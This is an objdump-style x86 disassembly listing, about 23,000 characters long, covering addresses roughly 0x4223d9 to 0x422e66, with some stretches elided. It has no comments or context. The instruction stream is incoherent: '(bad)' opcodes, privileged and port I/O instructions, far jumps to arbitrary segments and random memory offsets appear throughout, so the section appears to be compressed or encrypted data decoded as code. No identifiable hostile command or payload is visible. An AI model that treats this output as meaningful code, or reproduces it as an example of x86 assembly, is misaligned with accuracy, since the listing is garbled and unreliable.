  4223d9:	les    eax,FWORD PTR [eax-0x52df85be]
  4223df:	mov    ch,0x5b
  4223e1:	xchg   ebx,eax
  4223e2:	cwde   
  4223e3:	in     eax,dx
  4223e4:	adc    DWORD PTR [ebp-0x3aa59e57],0x211edc56
  4223ee:	jl     0x4223b7
  4223f0:	add    BYTE PTR [edi+0x318fd3b4],ch
  4223f6:	add    al,ch
  4223f8:	adc    ch,BYTE PTR ds:0xdebfe9e3
  4223fe:	mov    ebx,DWORD PTR [edi-0x459720aa]
  422404:	inc    edi
  422405:	aam    0x3f
  422407:	mov    ds,WORD PTR [ecx-0xe4c2e65]
  42240d:	sahf   
  42240e:	push   esp
  42240f:	hlt    
  422410:	and    al,0x37
  422412:	std    
  422413:	inc    edx
  422414:	pop    eax
  422415:	nop
  422416:	mov    ds:0x5eba6f32,eax
  42241b:	inc    esp
  42241c:	js     0x422404
  42241e:	inc    esi
  42241f:	aaa    
  422420:	call   0xced95505
  422425:	cmp    al,0xcb
  422427:	cmp    BYTE PTR [edi-0x11325a8c],0x1a
  42242e:	mov    edi,0x5714b8a
  422433:	dec    ebp
  422434:	out    dx,eax
  422435:	loop   0x4223d9
  422437:	push   0xffffffd3
  422439:	mov    esp,0xdcb96589
  42243e:	ror    DWORD PTR [edx],1
  422440:	and    DWORD PTR [esi+eiz*2+0x18472c62],ecx
  422447:	xchg   esi,eax
  422448:	pop    eax
  422449:	sub    BYTE PTR [esi-0x40e26529],ah
  42244f:	mov    esp,0x88c974b7
  422454:	test   al,0x63
  422456:	pop    esp
  422457:	jne    0x4224c2
  422459:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42245a:	lsl    esi,WORD PTR [ebp+0xf]
  42245e:	mov    edx,0x88d882d8
  422463:	pop    ds
  422464:	mov    edi,0xc1b3eec3
  422469:	adc    DWORD PTR [edx],ecx
  42246b:	and    ah,BYTE PTR [ebx+0x0]
	...
  4224d6:	push   edx
  4224d7:	sub    BYTE PTR [esi],0x69
  4224da:	(bad)  
  4224db:	in     eax,dx
  4224dc:	push   edi
  4224dd:	mov    ebx,0x99e531bb
  4224e2:	out    dx,eax
  4224e3:	mov    ch,0x86
  4224e5:	mov    al,ds:0x16fce
  4224ea:	inc    DWORD PTR [eax]
  4224ec:	add    BYTE PTR [eax],al
  4224ee:	dec    eax
  4224ef:	in     eax,dx
  4224f0:	dec    edx
  4224f1:	lea    ebx,[ebx-0x34a818d2]
  4224f7:	adc    BYTE PTR [eax],al
  4224f9:	cli    
  4224fa:	dec    esp
  4224fb:	jecxz  0x4224a9
  4224fd:	push   0x1b77cdd3
  422502:	pop    es
  422503:	cmp    DWORD PTR [esi+0x756f4369],esi
  422509:	add    dl,BYTE PTR [eax+0xf]
  42250c:	aam    0x6d
  42250e:	scas   al,BYTE PTR es:[edi]
  42250f:	rcl    ah,1
  422511:	dec    eax
  422512:	xlat   BYTE PTR ds:[bx]
  422514:	fistp  DWORD PTR [ecx+0x75]
  422517:	es stc 
  422519:	ret    
  42251a:	cmp    al,0x16
  42251c:	push   cs
  42251d:	push   eax
  42251e:	test   BYTE PTR ds:0xa7f6b92b,bl
  422524:	out    0x6d,al
  422526:	mov    ecx,DWORD PTR [edx]
  422528:	jbe    0x42255a
  42252a:	push   ss
  42252b:	cmp    DWORD PTR [ebx+0x11],ebp
  42252e:	pop    ss
  42252f:	mov    ecx,0x532068b3
  422534:	pop    ecx
  422535:	sub    al,0xa0
  422537:	sub    BYTE PTR [edi-0x4c2cb7d9],ch
  42253d:	pop    ebx
  42253e:	and    BYTE PTR [ecx-0x19],dh
  422541:	jg     0x4224d1
  422543:	arpl   di,dx
  422545:	rcr    DWORD PTR [edi-0x2bfa0348],0x8f
  42254c:	ins    BYTE PTR es:[edi],dx
  42254d:	cmp    cl,BYTE PTR [edi-0x7cfc292e]
  422553:	lock or ah,BYTE PTR [ebx-0x2eaf543b]
  42255a:	jae    0x422502
  42255c:	cmc    
  42255d:	add    eax,ecx
  42255f:	(bad)  
  422561:	jp     0x422510
  422563:	xor    DWORD PTR [ebp-0x51],edi
  422566:	stc    
  422567:	cwde   
  422568:	fist   DWORD PTR [eax+0x67ea98e]
  42256e:	mov    edi,DWORD PTR [edx]
  422570:	inc    esp
  422571:	or     al,cl
  422573:	fadd   DWORD PTR [esi-0x63]
  422576:	mov    bh,0x24
  422578:	adc    ebp,DWORD PTR ds:0x8a112a91
  42257e:	mov    al,0x28
  422580:	pop    ss
  422581:	test   al,0x50
  422583:	mov    esi,0x2557f624
  422588:	inc    ebx
  422589:	iret   
  42258a:	arpl   dx,bp
  42258c:	fstp   DWORD PTR [edi+0x39]
  42258f:	push   ds
  422590:	push   cs
  422591:	dec    eax
  422592:	scas   eax,DWORD PTR es:[edi]
  422593:	push   ds
  422594:	cli    
  422595:	push   ebx
  422596:	in     eax,dx
  422597:	clc    
  422598:	sub    al,BYTE PTR [edi+eax*8-0x22]
  42259c:	icebp  
  42259d:	inc    ebp
  42259e:	adc    ebx,esp
  4225a0:	adc    ah,bl
  4225a2:	shl    BYTE PTR [edx-0x20],0x8e
  4225a6:	leave  
  4225a7:	gs xchg ebx,eax
  4225a9:	or     DWORD PTR [ebp+0x39],esi
  4225ac:	push   0x2
  4225ae:	(bad)  
  4225b0:	pop    ebp
  4225b1:	sub    eax,0x5758c9c2
  4225b6:	in     al,0x63
  4225b8:	mov    bl,0xcf
  4225ba:	sbb    al,0x65
  4225bc:	dec    ecx
  4225bd:	out    0x13,al
  4225bf:	adc    ch,bh
  4225c1:	fidivr DWORD PTR [eax+esi*4-0x2]
  4225c5:	sub    al,0x29
  4225c7:	loop   0x422602
  4225c9:	add    esi,esp
  4225cb:	adc    DWORD PTR [esi-0x4ec560de],ebx
  4225d1:	dec    ecx
  4225d2:	or     al,0xff
  4225d4:	push   edx
  4225d6:	mov    ecx,0x82b5c748
  4225db:	sbb    BYTE PTR [ecx+0x3a],bl
  4225de:	popa   
  4225df:	xchg   ecx,eax
  4225e0:	fwait
  4225e1:	or     al,0xc7
  4225e3:	inc    eax
  4225e4:	fs hlt 
  4225e6:	pop    ds
  4225e7:	add    al,0x51
  4225e9:	neg    DWORD PTR [ebp+0x75]
  4225ec:	adc    al,BYTE PTR [eax]
	...
  422656:	call   0xfa77:0xbf778fae
  42265d:	out    dx,eax
  42265e:	sbb    esi,DWORD PTR [ecx+0x1903a2f8]
  422664:	retf   0xcd6e
  422667:	jo     0x42266a
  422669:	add    bh,bh
  42266b:	add    BYTE PTR [eax],al
  42266d:	add    BYTE PTR [ecx-0x30e8d4ac],dl
  422673:	cmp    edi,DWORD PTR [eax]
  422675:	xchg   DWORD PTR [ebx-0x3b],edx
  422678:	stos   BYTE PTR es:[edi],al
  422679:	sbb    al,0xbe
  42267b:	in     al,0xd6
  42267d:	or     al,0xac
  42267f:	push   es
  422680:	fs aam 0xea
  422683:	jp     0x422641
  422685:	dec    edi
  422686:	sbb    dl,BYTE PTR es:[esi]
  422689:	cwde   
  42268a:	jmp    0x8de4:0xb244af38
  422691:	out    0x9d,eax
  422693:	xchg   esi,eax
  422694:	outs   dx,BYTE PTR ds:[esi]
  422695:	mov    BYTE PTR [ebx-0x79],0x2c
  422699:	dec    eax
  42269a:	ja     0x4226c1
  42269c:	int3   
  42269d:	xor    al,0xc0
  42269f:	mov    eax,ds:0x2cd09aa5
  4226a4:	xor    eax,0x15e7384e
  4226a9:	out    dx,eax
  4226aa:	dec    eax
  4226ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226ad:	jnp    0x422678
  4226af:	xor    eax,0xeee55690
  4226b4:	dec    edx
  4226b5:	jl     0x422650
  4226b7:	hlt    
  4226b8:	mov    al,ds:0xd42297cc
  4226bd:	test   al,0x12
  4226bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226c0:	pop    eax
  4226c1:	sbb    eax,DWORD PTR [ebx-0x34]
  4226c4:	add    DWORD PTR [edx-0x1bc3916f],esi
  4226ca:	loopne 0x42267e
  4226cc:	xchg   DWORD PTR [edi+0xa36d05e],esi
  4226d2:	sar    BYTE PTR [edi-0x2b],cl
  4226d5:	xor    cl,dl
  4226d7:	(bad)  
  4226d8:	lea    edi,[edi+0x77ffb06d]
  4226de:	(bad)  
  4226df:	fist   WORD PTR [ebx-0x77ca0083]
  4226e5:	mov    bl,bh
  4226e7:	out    0xd,al
  4226e9:	rol    bl,cl
  4226eb:	sbb    ah,BYTE PTR [edi]
  4226ed:	sbb    dh,al
  4226ef:	jno    0x422755
  4226f1:	inc    edx
  4226f2:	push   cs
  4226f3:	popf   
  4226f4:	xchg   ebx,eax
  4226f5:	jg     0x422680
  4226f7:	(bad)  
  4226f8:	hlt    
  4226f9:	xchg   edx,eax
  4226fa:	add    al,0xd7
  4226fc:	add    ah,BYTE PTR [edi]
  4226fe:	cmp    cl,cl
  422700:	int3   
  422701:	push   edx
  422702:	push   edx
  422703:	data16 fbstp TBYTE PTR [edi]
  422706:	in     al,0x66
  422708:	cmp    BYTE PTR [edx+0x73],bl
  42270b:	sub    al,0xa0
  42270d:	mov    cl,0x28
  42270f:	(bad)  
  422710:	ffree  st(3)
  422712:	loop   0x4226a9
  422714:	aaa    
  422715:	jecxz  0x4226e3
  422717:	fmul   QWORD PTR [edx]
  422719:	(bad)
  42271c:	and    eax,0x54065ca8
  422721:	loop   0x4226c4
  422723:	nop
  422724:	add    al,0x8
  422726:	xor    DWORD PTR [edx+0x7d],ecx
  422729:	xor    ah,BYTE PTR [ecx+0xe]
  42272c:	aam    0x36
  42272e:	test   BYTE PTR [edx],dl
  422730:	sbb    al,0x4d
  422732:	mov    ds:0x8cf00eb1,al
  422737:	jne    0x422727
  422739:	xchg   edi,eax
  42273a:	or     esi,ecx
  42273c:	cmp    BYTE PTR [edi-0x15f31579],dl
  422742:	pop    eax
  422743:	jg     0x422716
  422745:	aad    0xbe
  422747:	jecxz  0x4226f6
  422749:	jl     0x4226f0
  42274b:	test   DWORD PTR [ebp+0x2996f283],edi
  422751:	into   
  422752:	mov    edi,0x159b0320
  422757:	test   DWORD PTR [edx+0x3d],ebx
  42275a:	out    0x7b,al
  42275c:	mov    BYTE PTR [ebx],cl
  42275e:	popf   
  42275f:	cmp    DWORD PTR [edx],ebx
  422761:	std    
  422762:	mov    BYTE PTR [ebx-0x460a0c51],0xbc
  422769:	div    DWORD PTR [edx+0x84de]
	...
  4227d3:	add    BYTE PTR [eax],al
  4227d5:	add    BYTE PTR [edi],ah
  4227d7:	sub    eax,0x7d7f2d7d
  4227dc:	ja     0x42280d
  4227de:	mov    esi,0x237f01c8
  4227e3:	xor    ebp,DWORD PTR [ecx-0x61]
  4227e6:	int3   
  4227e7:	jno    0x4227ea
  4227e9:	add    bh,bh
  4227eb:	add    BYTE PTR [eax],al
  4227ed:	add    bh,dl
  4227ef:	adc    eax,ebp
  4227f1:	jno    0x422827
  4227f3:	xchg   esp,eax
  4227f4:	sbb    ebx,DWORD PTR [ebx-0x4b925348]
  4227fa:	sbb    al,0xcb
  4227fc:	jbe    0x42282d
  4227fe:	jno    0x422849
  422800:	mov    dl,0x73
  422802:	cwde   
  422803:	sub    al,0xbd
  422805:	inc    ecx
  422806:	and    eax,0x6b2693b4
  42280b:	push   ebp
  42280c:	mov    cs,WORD PTR [ecx+0x71]
  42280f:	lahf   
  422810:	xchg   esi,eax
  422811:	ins    BYTE PTR es:[edi],dx
  422812:	push   eax
  422813:	in     al,0xa9
  422815:	sbb    BYTE PTR [eax],dl
  422817:	sbb    ch,al
  422819:	fs pushf 
  42281b:	sbb    al,0xa3
  42281d:	xor    al,0x4f
  42281f:	movups XMMWORD PTR [eax+0x165707ad],xmm6
  422826:	mov    ds:0x93b94d7f,al
  42282b:	add    BYTE PTR [esi+0x579f5eec],cl
  422831:	ror    BYTE PTR [ebx+edx*4-0x76],0xd8
  422836:	push   ss
  422837:	outs   dx,BYTE PTR ds:[esi]
  422838:	cld    
  422839:	fmul   st,st(3)
  42283b:	(bad)
  42283f:	and    eax,0xa415f3c0
  422844:	cld    
  422845:	setnp  ch
  422848:	icebp  
  422849:	xchg   edx,eax
  42284a:	sahf   
  42284b:	neg    BYTE PTR [ebx]
  42284d:	fidiv  WORD PTR [ebx]
  42284f:	push   0xdf9d61bf
  422854:	pop    edi
  422855:	dec    esi
  422856:	mov    bh,0x79
  422858:	mov    esi,0xb07a1b6
  42285d:	add    esp,DWORD PTR [esi+0x1fd57c97]
  422863:	(bad)  
  422864:	imul   esi,esp,0x71
  422867:	fwait
  422868:	imul   BYTE PTR [ebp+0x6c]
  42286b:	and    al,0x7a
  42286d:	fnstcw WORD PTR [eax+0x4d]
  422870:	test   DWORD PTR [eax+0x1d],0x8bee94e
  422877:	les    edx,FWORD PTR [ebx]
  422879:	out    0x5b,al
  42287b:	fs cdq 
  42287d:	add    DWORD PTR [edi+eax*2+0x3c848109],edx
  422884:	loopne 0x4228eb
  422886:	add    eax,0x1485bcaa
  42288b:	push   ebp
  42288c:	add    BYTE PTR [ecx+0x393ec0cb],ah
  422892:	ins    DWORD PTR es:[edi],dx
  422893:	dec    edx
  422894:	retf   
  422895:	xchg   ecx,eax
  422896:	mov    ds:0x2c8e87ef,eax
  42289b:	pop    edi
  42289c:	cmc    
  42289d:	and    cl,BYTE PTR [ebx]
  42289f:	test   BYTE PTR [ecx-0xfa106ac],dl
  4228a5:	xor    al,0x61
  4228a7:	push   0x7e
  4228a9:	push   ecx
  4228aa:	fdivr  QWORD PTR ds:0xb3179d48
  4228b0:	in     eax,0xda
  4228b2:	pop    ebx
  4228b3:	xor    bh,BYTE PTR [ebp+0x3301ea12]
  4228b9:	adc    BYTE PTR [ebx+edi*2],al
  4228bc:	and    bh,ah
  4228be:	mov    bh,0xe2
  4228c0:	icebp  
  4228c1:	in     eax,0x11
  4228c3:	(bad)  
  4228c4:	lock retf 
  4228c6:	push   es
  4228c7:	or     edx,DWORD PTR [edi+0x2ced7718]
  4228cd:	mov    cs,WORD PTR [edi+0x47]
  4228d0:	mov    ebx,0xcb3f2a02
  4228d5:	pop    esp
  4228d6:	mov    al,ds:0x58362e73
  4228db:	or     eax,DWORD PTR [ebx-0x8]
  4228de:	cmp    eax,0x84ca9c9b
  4228e3:	cwde   
  4228e4:	ins    BYTE PTR es:[edi],dx
  4228e5:	bound  eax,QWORD PTR [edi+0x48]
  4228e8:	add    DWORD PTR [ecx+0xd3c14e],ecx
	...
  422956:	int    0x39
  422958:	mov    eax,0xef97fc97
  42295d:	jnp    0x42291d
  42295f:	outs   dx,DWORD PTR ds:[esi]
  422960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422961:	loopne 0x42299c
  422963:	stos   BYTE PTR es:[edi],al
  422964:	(bad)  
  422965:	call   0xff:0x172cb
  42296c:	add    BYTE PTR [eax],al
  42296e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42296f:	dec    ebx
  422970:	leave  
  422971:	les    ebp,FWORD PTR [ebp-0x2529c22f]
  422977:	add    al,0xd4
  422979:	je     0x4229be
  42297b:	icebp  
  42297c:	fstp   QWORD PTR [ebx+0x2bff9e41]
  422982:	push   0x51
  422984:	je     0x42293c
  422986:	sub    bl,BYTE PTR [ecx-0x5]
  422989:	adc    eax,0xba07db8f
  42298e:	stos   BYTE PTR es:[edi],al
  42298f:	xlat   BYTE PTR ds:[ebx]
  422990:	std    
  422991:	pop    ds
  422992:	mov    dl,0x82
  422994:	pop    ebx
  422995:	jmp    0x78709866
  42299a:	inc    edx
  42299b:	xor    DWORD PTR [edi+0x3a],0xbb21f71a
  4229a2:	or     al,0x4c
  4229a4:	or     DWORD PTR [esi],0x2c5ebd26
  4229aa:	dec    ebx
  4229ab:	das    
  4229ac:	fild   DWORD PTR [eax]
  4229ae:	push   edi
  4229af:	mov    eax,ds:0x4d6873ec
  4229b4:	jmp    0x4229bf
  4229b6:	pop    ebp
  4229b7:	xchg   edx,eax
  4229b8:	pop    edx
  4229b9:	mov    ch,0x6e
  4229bb:	mov    esp,?
  4229bd:	push   edi
  4229be:	addr16 je 0x4229bf
  4229c1:	dec    ebp
  4229c2:	repz push 0xffffffea
  4229c5:	add    eax,0x49
  4229c8:	xor    al,0xda
  4229ca:	fwait
  4229cb:	and    BYTE PTR [edx+0x30c7bb48],al
  4229d1:	push   ecx
  4229d2:	in     al,dx
  4229d3:	mov    esi,0xf0f55815
  4229d8:	pushf  
  4229d9:	adc    DWORD PTR [edx-0x4665682f],ebp
  4229df:	cwde   
  4229e0:	ret    
  4229e1:	mov    esp,0xfdfbdbd8
  4229e6:	(bad)  
  4229e7:	cld    
  4229e8:	icebp  
  4229e9:	leave  
  4229ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229eb:	ror    DWORD PTR [edx+0x1aa0bac2],1
  4229f1:	(bad)  
  4229f2:	mov    ch,0x0
  4229f4:	ins    DWORD PTR es:[edi],dx
  4229f5:	add    al,0xdc
  4229f7:	js     0x4229a0
  4229f9:	xchg   esi,eax
  4229fa:	cmp    BYTE PTR [ebx-0x2ca0b72],ah
  422a00:	add    al,0x33
  422a02:	fisttp QWORD PTR [ecx+eax*2-0x3ae7bd88]
  422a09:	pop    eax
  422a0a:	push   esi
  422a0b:	xchg   ch,dh
  422a0d:	loop   0x422a51
  422a0f:	mov    ecx,DWORD PTR [edi+0x33]
  422a12:	and    BYTE PTR [ebx-0x4833ca4],al
  422a18:	repnz (bad) 
  422a1a:	cld    
  422a1b:	add    ecx,DWORD PTR [ebx+ebx*1-0x74784068]
  422a22:	not    DWORD PTR [edx+ebx*8]
  422a25:	mov    eax,0xef7dda23
  422a2a:	pop    ebx
  422a2b:	dec    ebp
  422a2c:	mov    dl,0xef
  422a2e:	ror    BYTE PTR [eax],1
  422a30:	jmp    0x422a1d
  422a32:	mov    esp,0x33d6a42
  422a37:	imul   ebx,DWORD PTR [edx],0xffffff83
  422a3a:	xchg   DWORD PTR [eax],edi
  422a3c:	xchg   esp,eax
  422a3d:	xchg   ecx,eax
  422a3e:	into   
  422a3f:	fs mul esi
  422a42:	and    BYTE PTR [edi-0x52],ah
  422a45:	sbb    al,0xde
  422a47:	jmp    0x8028:0xb23c057a
  422a4e:	addr16 sbb al,0xfd
  422a51:	mov    bh,0x13
  422a53:	iret   
  422a54:	pop    edi
  422a55:	push   ds
  422a56:	(bad)  
  422a57:	in     eax,dx
  422a58:	stos   DWORD PTR es:[edi],eax
  422a59:	jb     0x422a60
  422a5b:	mov    al,0xc1
  422a5d:	pop    ecx
  422a5e:	inc    edi
  422a5f:	shr    bh,1
  422a61:	(bad)
  422a66:	int3   
  422a67:	sub    al,0xae
  422a69:	dec    edx
  422a6a:	inc    ebp
  422a6b:	es jmp 0x422a71
	...
  422ad5:	add    BYTE PTR [esi-0x377e796],dl
  422adb:	cli    
  422adc:	xchg   esi,eax
  422add:	jle    0x422ab0
  422adf:	push   esp
  422ae0:	je     0x422a9f
  422ae2:	mov    esp,0xcaf25b0d
  422ae7:	jae    0x422aea
  422ae9:	add    bh,bh
  422aeb:	add    BYTE PTR [eax],al
  422aed:	add    BYTE PTR [ebx-0x1915dbae],ah
  422af3:	ret    
  422af4:	shr    bl,cl
  422af6:	arpl   WORD PTR [eax+0x16956013],si
  422afc:	mov    fs,WORD PTR [ebx]
  422afe:	push   es
  422aff:	mov    ebx,DWORD PTR [esi+eax*2-0x159db513]
  422b06:	push   ecx
  422b07:	ins    DWORD PTR es:[edi],dx
  422b08:	add    eax,0xd524239d
  422b0d:	cvtps2pd xmm0,QWORD PTR [edi-0x559884ec]
  422b14:	jmp    FWORD PTR es:0x8fdd0bf0
  422b1b:	(bad)  
  422b1c:	dec    ecx
  422b1d:	adc    ch,ah
  422b1f:	ins    BYTE PTR es:[edi],dx
  422b20:	les    esp,FWORD PTR [eax]
  422b22:	imul   ebp,esi,0x97372bf8
  422b28:	out    0x36,eax
  422b2a:	jge    0x422b62
  422b2c:	mov    WORD PTR [ecx+ecx*1+0x380b7d09],?
  422b33:	iret   
  422b34:	or     BYTE PTR [esi+0x7b],0x14
  422b38:	leave  
  422b39:	jbe    0x422bac
  422b3b:	mov    bl,0x8e
  422b3d:	fstp   TBYTE PTR [ecx-0x45]
  422b40:	sbb    al,0xc2
  422b42:	test   BYTE PTR [ebp-0x1a47832e],cl
  422b48:	ins    BYTE PTR es:[edi],dx
  422b49:	(bad)  
  422b4a:	sub    cl,BYTE PTR ds:0xddd69811
  422b50:	(bad)  
  422b51:	cmp    esi,DWORD PTR [ecx-0x29]
  422b54:	in     eax,dx
  422b55:	bound  esi,QWORD PTR [edx+0x26ff15f3]
  422b5b:	mov    eax,0xb1d38947
  422b60:	sub    eax,eax
  422b62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b63:	fsubr  QWORD PTR [eax-0x2d]
  422b66:	gs xchg ebx,eax
  422b68:	or     DWORD PTR [ebx],0xb737d6cb
  422b6e:	adc    eax,0x4d36eb86
  422b73:	inc    edx
  422b74:	dec    edx
  422b75:	jmp    0xfecbd9f3
  422b7a:	mov    esi,0x3516230a
  422b7f:	xchg   esi,eax
  422b80:	push   esp
  422b81:	aad    0xbf
  422b83:	mov    bl,0xc1
  422b85:	sbb    BYTE PTR ds:0xf7713281,dh
  422b8b:	inc    esp
  422b8c:	in     al,0x4c
  422b8e:	lods   al,BYTE PTR ds:[esi]
  422b8f:	cmp    ecx,DWORD PTR [ebx-0x2dabe43d]
  422b95:	outs   dx,BYTE PTR ds:[esi]
  422b96:	jnp    0x422b95
  422b98:	mov    ebp,0xe5439ee8
  422b9d:	dec    ecx
  422b9e:	div    ecx
  422ba0:	sar    BYTE PTR [esi-0x5],1
  422ba3:	das    
  422ba4:	jb     0x422b63
  422ba6:	jecxz  0x422bb2
  422ba8:	ret    
  422ba9:	add    al,0xb3
  422bab:	ffreep st(0)
  422bad:	or     eax,0x141ec07a
  422bb2:	leave  
  422bb3:	mov    dh,0x39
  422bb5:	fwait
  422bb6:	div    ah
  422bb8:	in     eax,dx
  422bb9:	inc    ebx
  422bba:	es adc al,0x56
  422bbd:	sbb    edi,DWORD PTR [ebx]
  422bbf:	pop    ecx
  422bc0:	jno    0x422bf1
  422bc2:	scas   eax,DWORD PTR es:[edi]
  422bc3:	rcr    esi,0x50
  422bc6:	scas   al,BYTE PTR es:[edi]
  422bc7:	xchg   ecx,eax
  422bc8:	inc    edi
  422bc9:	fwait
  422bca:	inc    edx
  422bcb:	mov    esp,0xd510ef8
  422bd0:	rol    BYTE PTR [ebp+eax*4-0x17fa805a],cl
  422bd7:	pop    ds
  422bd8:	sub    al,0x40
  422bda:	push   ecx
  422bdb:	xchg   esi,eax
  422bdc:	dec    eax
  422bdd:	jbe    0x422b6d
  422bdf:	xchg   ecx,eax
  422be0:	sbb    DWORD PTR [eax-0x22d30e2b],edi
  422be6:	popf   
  422be7:	js     0x422b7a
  422be9:	add    esi,ebx
  422beb:	cmp    BYTE PTR [eax+eax*1+0x0],dh
	...
  422c56:	inc    esp
  422c57:	aaa    
  422c58:	dec    edx
  422c59:	fwait
  422c5a:	jnp    0x422c5b
  422c5c:	aad    0xff
  422c5e:	sbb    dl,BYTE PTR [edx-0x49abb264]
  422c64:	sub    eax,0x174c90d
  422c69:	add    bh,bh
  422c6b:	add    BYTE PTR [eax],al
  422c6d:	add    BYTE PTR [esi+0x1de00094],cl
  422c73:	adc    dl,BYTE PTR [eax+0x3933a2b]
  422c79:	ror    DWORD PTR [esi],0xa0
  422c7c:	dec    esp
  422c7d:	shl    BYTE PTR [esi+0x685dd940],1
  422c83:	push   ebx
  422c84:	xor    esi,DWORD PTR [ebx+0x24]
  422c87:	repnz xor eax,esp
  422c8a:	push   ss
  422c8b:	nop
  422c8c:	adc    DWORD PTR [eax-0x3e126105],0x5e
  422c93:	push   esi
  422c94:	clc    
  422c95:	pop    ecx
  422c96:	pop    es
  422c97:	push   edx
  422c98:	pop    ss
  422c99:	mov    DWORD PTR [ebp+eax*1-0x16619f29],esi
  422ca0:	sti    
  422ca1:	add    al,0x8b
  422ca3:	into   
  422ca4:	add    eax,0x5a7719ae
  422ca9:	jle    0x422cb2
  422cab:	das    
  422cac:	bswap  edx
  422cae:	sub    BYTE PTR [esi-0x446573c3],cl
  422cb4:	xchg   DWORD PTR [edi+0x51ceabb5],esi
  422cba:	push   ebx
  422cbb:	js     0x422d0f
  422cbd:	sub    eax,0x608bbd76
  422cc2:	int    0xe4
  422cc4:	cwde   
  422cc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422cc6:	mov    DWORD PTR [esp+edi*4],eax
  422cc9:	xchg   BYTE PTR [ebx],bh
  422ccb:	sbb    ebx,esi
  422ccd:	frstor [esi+0x69a3adaa]
  422cd3:	loopne 0x422d2e
  422cd5:	jne    0x422ca3
  422cd7:	dec    esp
  422cd8:	mov    edx,0xc01faf8c
  422cdd:	dec    edx
  422cde:	mov    cl,bh
  422ce0:	xchg   ecx,eax
  422ce1:	xor    eax,0xb8a4b2fd
  422ce6:	out    dx,eax
  422ce7:	scas   al,BYTE PTR es:[edi]
  422ce8:	sub    BYTE PTR [ecx+0x62],dh
  422ceb:	dec    esi
  422cec:	rol    ebx,1
  422cee:	inc    esp
  422cef:	sahf   
  422cf0:	in     eax,dx
  422cf1:	jle    0x422ce6
  422cf3:	cbw    
  422cf5:	fist   DWORD PTR [esi]
  422cf7:	sti    
  422cf8:	add    DWORD PTR [esi-0x50],ecx
  422cfb:	imul   edx,DWORD PTR ds:0x3d6e0deb,0xffffffb4
  422d02:	xchg   ebp,eax
  422d03:	xor    al,0xf4
  422d05:	mov    edx,0xad06001a
  422d0a:	stos   DWORD PTR es:[edi],eax
  422d0b:	cmp    BYTE PTR [edi+0x77ed7150],bl
  422d11:	sbb    DWORD PTR [edx+0x28],ebx
  422d14:	aas    
  422d15:	sub    al,BYTE PTR [ebx]
  422d17:	icebp  
  422d18:	mov    cl,0x45
  422d1a:	pop    ds
  422d1b:	jb     0x422d95
  422d1d:	scas   al,BYTE PTR es:[edi]
  422d1e:	xor    eax,0x3bd47400
  422d23:	pop    edi
  422d24:	mov    ss,edi
  422d26:	and    al,BYTE PTR [ebp-0x24]
  422d29:	adc    edi,DWORD PTR [edi]
  422d2b:	mov    ebp,edx
  422d2d:	jno    0x422d18
  422d2f:	jmp    0x422cb2
  422d31:	push   ds
  422d32:	and    DWORD PTR [edi],esp
  422d34:	in     eax,0x4
  422d36:	dec    edi
  422d37:	cmp    ah,bl
  422d39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d3a:	addr16 sbb ecx,edi
  422d3d:	fs call 0x14fcf13
  422d43:	lods   eax,DWORD PTR ds:[esi]
  422d44:	dec    edx
  422d45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d46:	loopne 0x422cf1
  422d48:	or     eax,edi
  422d4a:	daa    
  422d4b:	ds mov bl,0x7e
  422d4e:	out    0xb3,al
  422d50:	loopne 0x422cf7
  422d52:	adc    BYTE PTR [edi+edi*1+0x24382140],dl
  422d59:	pop    esi
  422d5a:	int    0xb4
  422d5c:	test   DWORD PTR [ebp-0x7c4c09e7],ebx
  422d62:	add    dl,dh
  422d64:	mov    BYTE PTR [edi+0x74a770c1],bh
  422d6a:	clc    
  422d6b:	add    BYTE PTR [ecx+0x0],dh
	...
  422dd5:	add    BYTE PTR [edi+0x626d60bd],bh
  422ddb:	std    
  422ddc:	mov    edi,0x80797fff
  422de1:	sub    ecx,ebp
  422de3:	mov    bl,0xca
  422de5:	test   al,cl
  422de7:	jne    0x422dea
  422de9:	add    bh,bh
  422deb:	add    BYTE PTR [eax],al
  422ded:	add    al,bl
  422def:	pop    ebx
  422df0:	sbb    esi,DWORD PTR [edi]
  422df2:	fst    DWORD PTR [edi-0x21]
  422df5:	mov    edi,0x4dd19020
  422dfa:	jecxz  0x422dc6
  422dfc:	inc    edx
  422dfd:	mov    WORD PTR ds:0xd87012e,cs
  422e03:	inc    DWORD PTR [esi-0x2f]
  422e06:	or     edi,edi
  422e08:	mov    fs,edx
  422e0a:	dec    ebx
  422e0b:	dec    ebx
  422e0c:	add    al,0x17
  422e0e:	ret    0x3a39
  422e11:	sar    DWORD PTR [eax],cl
  422e13:	lods   al,BYTE PTR ds:[esi]
  422e14:	hlt    
  422e15:	aam    0x3f
  422e17:	js     0x422db4
  422e19:	mov    ah,0xfb
  422e1b:	pop    edi
  422e1c:	cmc    
  422e1d:	scas   al,BYTE PTR es:[edi]
  422e1e:	cmc    
  422e1f:	imul   ebp,ebp,0xffffff8d
  422e22:	add    BYTE PTR [ebx+0x2bfa6b27],al
  422e28:	test   BYTE PTR [esi+0x4c6141a4],al
  422e2e:	test   BYTE PTR [ecx+eax*4+0x31],ah
  422e32:	jnp    0x422e35
  422e34:	rcr    ch,0x4d
  422e37:	mov    ebx,0x1c2a0cbc
  422e3c:	inc    ebp
  422e3d:	scas   eax,DWORD PTR es:[edi]
  422e3e:	pop    ss
  422e3f:	push   es
  422e40:	sub    BYTE PTR [eax+eiz*8-0x5a6ad845],ah
  422e47:	je     0x422e02
  422e49:	rol    BYTE PTR [edx+0x6c],cl
  422e4c:	das    
  422e4d:	pop    esp
  422e4e:	cmp    BYTE PTR [eax-0x5519ab],ch
  422e54:	inc    eax
  422e55:	call   FWORD PTR [bx]
  422e58:	xchg   esi,eax
  422e59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e5a:	fld    TBYTE PTR [ecx+0x68eac6a0]
  422e60:	dec    edi
  422e61:	adc    BYTE PTR [edx],cl
  422e63:	xchg   DWORD PTR [ecx+0x3b],eax
  422e66:	adc    eax,0xf57a7b9b
